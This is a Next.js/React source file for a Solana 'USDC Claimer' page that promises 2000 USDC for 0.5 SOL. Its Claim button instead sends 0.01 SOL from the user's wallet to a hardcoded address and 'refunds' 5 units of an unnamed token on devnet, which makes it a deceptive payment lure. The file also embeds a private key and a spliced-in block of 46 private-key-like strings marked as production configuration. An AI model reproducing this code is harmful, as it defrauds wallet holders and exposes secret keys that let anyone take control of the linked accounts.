/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4Dcgg6LqftvBf461orGkztGaekQgNbkKEmHFsyoHzuyvExvgycuCZyueG74HWigXEUZmrfLbJMHR7Mt9Fd2E6qBg"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "37SC7eAZWW1yTXduSFTTBYzw1P4i57VSqARtoAk6yLHG68TRSeRPbEXHYf7wgTWAcMmnxyR1JGjRM2N5Z5KXSock",
  "key1": "VoLgSZzgrYykVtbtP5fzoW4wfyQgqPPf5U6ckcATTCkAavfVCornyv3hwEdzb9ZoKRxMmynUmqxZSu8THJhAnhJ",
  "key2": "4WSvvBpMouPnHwzWsyathqaGeveRt5xnWza28ALD9ah3MPqn3ZGat35eC5e6bdJRCCEGfMXMXgZUc6nh9TurN8uE",
  "key3": "3HfpvcUKqiM2KCXG6sMcgK38Sw1Jhdj9P9yYhK17QeoNNCkZ2HEeZMuKC7J5WwnsQYGHrx7TgUX6sMp4nBtmDRkX",
  "key4": "4cysnHDX6Hf8dC37Tqft4hXYhvmwP97zro9TMNEtwh4k38Ltc748XgjsMSkZgfMSRwsksHF1wkMzc8Lsg3CYV3VN",
  "key5": "814RRpezY2kbATodpU4npXNKQsuo1C7KiodZpsJoVtaK7WdfXVyuAqUwZcP2bZGuWPbatqPRapGhZiFoxp5sLPE",
  "key6": "31AqMLxcpioxtGmsD8YQSWt5FY6zQWLUh8Xy2bgkxwPfZhdRnSniToByKh6d34xYca3Qng1TU9RaMWpNeY63dApK",
  "key7": "N7faYDEJtby8N3c8QT24ED1dY7A7mCwLknGCwBNJfXAfNFqfDfYEc54RDTvGLtCAaKWngXgdk886M136RmLG1qr",
  "key8": "4rUb2GLN8za1su4jVMXvawfFtez6mwRoP3CS5QzeiPwLeknVmCZqFLAjH58dcwePWWAKKZq7Nd97jn8mfKY97dq4",
  "key9": "4WPBC82m3NorTqWxmevtowWf44TUX8C3LpPAacV4Fy2PWmXfEvZbpiwpnzFpGdRV5Dj7Zi9Dm89eA1KCHecuTZV6",
  "key10": "5XFYb84x4NpmYm7i8PdjTSrbmBPbonRx2MA31AJ69yAKLVrwmJ529eMXoeXktcgw4JpNpxyfmnaPgCcW9MyqaMMx",
  "key11": "2PZX94vjLMCWVWKrxk7Em8BULf7hHFRcHZFnpbE34qkcsjnNDvjG8y77uCpujUdVi33CeBmiHDNfd8kmjvKTzqw2",
  "key12": "qrD6wtLcQpwQ1LhC2WtmBMfA48y4Hhmf1BGFNfeiTKT5Bj2osbAHNFB5sM26T7DGfPqtdsVgAqWzW5quhvNL7PK",
  "key13": "3nmnjdKDKa3LnFPGCN4YFqMnFRCCNsev8agEZbazUrvEt9upJiGbGLfZpfooovqLYpuduFUN9D1e8r4pwEC3zSdS",
  "key14": "QkCgw6Nx5LMqQ3TwrEu1RuyGZK2zUB5bNfuedqJ459upyysheXAqPMKGsdtHGWBkJjj1aQtKEYmiseiqS4Lwoeg",
  "key15": "65DnQLwPnhhBo1LtqWmAW4pMBKKovK9pKcj6hmeMcPFcnrAW6sRZ5DAkDE5zb6S7Lwim5y2nRAviB9FY77Ggc3g1",
  "key16": "DaNJziWKhuvhpekeB8N8uhfcrdgGj3Kyi1LbuqzTSqBAFRjkbg57MzdpztB8nSQFfgtrWyHsWwP29dp511gZQBt",
  "key17": "2dz6wsgUZRDQuey1DU7pnXNM3ZQ93KpR6pvWiGhME6DTSyz3hQnvVuAg6u4iAUFGU5uCsWq8MfwN5fajDwp2q8j8",
  "key18": "4JM8e9VVXdbJHVsVWt3ayW7NESo4EK1NJFvr28HerASvKyzA77qRps7VqJBNa2XwfwUGHxwCf8vMxwFDEwYZ23r3",
  "key19": "2s4TQb6WcfkNJ3bofc8U6NuvvynEYbDUK65vpt34mGA2oa6XD4995LunjZYXDMxJmBBezjmd2BtkGjwSZAU8pMaY",
  "key20": "3aR2EUnxBwwtTp324E3VVQQEKqro25CwakXTUDhLkmQeJPHvVg8NUji6aigWG24qFaV37a7zCtQBS3R6wUMKKM2F",
  "key21": "ovHJSJbJKgTEA5QyWG1HTiVUgg7Bovv1KzvxfvG8SsJ9iTV8jThWXvgonQMUmo2zNrpMhX3Fnz3G94NBiZrQszp",
  "key22": "fW8PnFQM2AaHDEkArdC1dbsdzxSPMoMcFdAYPv7yMMQwbqeAgLDZuJmwrLeDBL8uRwbcqQDXQJYvrsnZtStxP21",
  "key23": "TPcGyuZHJuSZnwootZDsE4B321ca1VLo7LJVF8SeZNhbscqYFvwoMWzXpeKn9qsUhqNv4RUiAsLvLQMpu3DsC2h",
  "key24": "2KpmjhK69tSPDydoXczpmeeAh9Q4R2nh2BpL6fgadXGpscoQsvzpTjnmoxqhwyMLPWHUX4K7vduHK8px7XS2Di8E",
  "key25": "5Hi287Gx77bYCkMt8WjF6vRXR2jB4XvU9g6YLfrBpVBSJQPmEYdpVFWdVeLAJVrvsuw8V7WAbd2Wkg5TasXUzwmY",
  "key26": "5CGS821uVhDZT7xSCfcFPdmvYEHVe5xcywzYTGHk5Aw66ifxeu4ENQrAkMDYVzxGBBTBhUTMq4Bfu5Faui4B4UWY",
  "key27": "2XJ5SECfb5meu9ohMrRmq7fkaGk84pwBSmmQT3YWm9u3CGKcehA9qhKo6QK9frZqjbWLHjxQQYkArwsvZHoMwFbg",
  "key28": "5dQxHqkrxYdqgXSa6NqcSG9q9CBb1xVt3FzvmbG7LecDRCoTCBTaZdczhsopvJNywEugqjr9M69NFFavnhEzcSJA",
  "key29": "5ufHtYb47yDJt1ywSsXpwpz6XUrWdKHqw87X6P6e2nTdjA9234FPpC5V1obTXgsEYXsqYWEuGGDafWN3AbLj2ZNc",
  "key30": "41jhnhvBkCztuaRLWABgCgANQEEEACRc7g5p95qTL8xucPtjQPAwVDmYNK5CELSDZrqGQrPuLQ2bLUWgnAaZZYW4",
  "key31": "3ABYCfRuWGgSZU4DNr1D6RFpDB2a89qT9K8KqjZuCTRnvgpaVrd1hQqN8NBCyc4Y6FLjixK7tGi42xGwpKb9awYa",
  "key32": "5Kud4oE4sfrRk5Qtix691MgcWZajJ4a1R3o94NbsxYLdpjYMGYH9iptLA3yaTbRMEcqpnGb4fHGX7PfJ9ztrJkzE",
  "key33": "2gPHhTfgZmxxCMqyzXeNm4sxqNcv3FStTao8MhHMDgJDfoDqkTAesZKJrsiBjyJon5hmxiWjusNAC6L8167Dyn83",
  "key34": "2xzfm4AVrW9pcY9VbZ38fLSeW8dQ3aU4JUGCWA1ytuV3wU63uDAk4rpS7PtQCGueu8YjoMFc3nVVmw3oMU4e8q97",
  "key35": "3C7tiGtdcAsFewGGQaHXzRC1rZ7swdofHHfPtM7rcwGjyr1MjvfJtU5CYwrnCSGYL1pjCzgqdtNLeXDnvADo3weQ",
  "key36": "5JVw1njGYHPXNiSTsRwmGnb73RAdAT5SKTwE54pdKtcKaKBdhLnzrrRrDxD78242LsJBWopQnLrSqGeduRkfFbSd",
  "key37": "3rM75ejXeb1Tirg9sNHuUzQfcsPxQJHkHwepwC8qeJ6XcndyBTbZatGKYucaULxriK9pKoDMqXuz12DW6UkJjUAS",
  "key38": "4tzxXXHDwc9JgJhqJd8dYLnxo6ebgyAJUgiYGAW96r8S9J5pDafnzPbKez34WhBQ9dwAjT7LiUuhBx5gi9D1MXim",
  "key39": "3DoTns415Psv7ibDbXoWQAyaNn5KQjazAFciS7zpqNM7JQNtGEHk5LvQmbDPYXYRqhrnjZrd1i7yKCHKRe8Qr398",
  "key40": "4Ug3veX3vgNfB55YPPmRBAFASqUGnU7Mf2SMHbAt2VAGrQaAW6b1wjDKHDBRQejrh7bKt1aA7NLhy5xnTbqYS2qw",
  "key41": "uBMjn87ZhLBrqa474L4rFgMv383ukkfimD8hXo4iUqtch8VSprX4ppFKXbkfzsSizmKtBbV8XERoqHA1m3qmzQ3",
  "key42": "GYGchBxGfiagS49tvPueYveVkr6tCMtgCZas5KCvEE27M3bC3crEP6N5guFB8ZmKfR6Z8LEbRgoWnHQDpvoSZsC",
  "key43": "4csgk4g3Wyofii6KkLHJ1YvjharcwzUsD5J6ZAFYJYRLs9PpnVYfp6ks16ax8Vcw6rkYtjxkn3oCxedUqeiA3rPN",
  "key44": "47xz2RuV97gNjvJZqprQ4YEjvHrgxxYB1urW7o1wvLpAa6xWSKrbUrj5sGDwzW16RXCVDeheTk58Vo8dCPQtpHgM",
  "key45": "kL35MLEtkqv9vPXNZpv4FJ4otDtfCBHmCgqW2dz6cd8Kta6rRyjqWE4hzRSwg3znBT2LVWsjqJEmY91cL37nnPA"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
